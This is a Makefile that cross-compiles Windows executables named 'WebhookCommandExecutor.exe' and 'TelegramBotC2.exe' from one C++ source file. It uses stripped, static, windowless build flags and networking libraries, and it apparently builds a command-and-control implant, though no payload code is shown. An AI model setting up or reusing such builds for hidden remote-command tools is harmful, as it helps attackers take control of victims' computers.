CXX = i686-w64-mingw32-g++
WEBHOOK_TARGET = WebhookCommandExecutor.exe
TELEGRAM_TARGET = TelegramBotC2.exe
WEBHOOK_SRC = re_webhook.cpp
TELEGRAM_SRC = re_webhook.cpp 
LIBS = -lwininet -lgdi32 -liphlpapi -lws2_32 -lpthread
CXXFLAGS = -std=c++11 -static-libstdc++ -static-libgcc -static -s -O2 -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -mwindows

.PHONY: all clean telegram webhook

all: webhook

webhook: $(WEBHOOK_TARGET)

telegram: $(TELEGRAM_TARGET)

$(WEBHOOK_TARGET): $(WEBHOOK_SRC)
	$(CXX) $(CXXFLAGS) $(WEBHOOK_SRC) -o $(WEBHOOK_TARGET) $(LIBS)

$(TELEGRAM_TARGET): $(TELEGRAM_SRC)
	$(CXX) $(CXXFLAGS) $(TELEGRAM_SRC) -o $(TELEGRAM_TARGET) $(LIBS)

clean:
	rm -f $(WEBHOOK_TARGET) $(TELEGRAM_TARGET)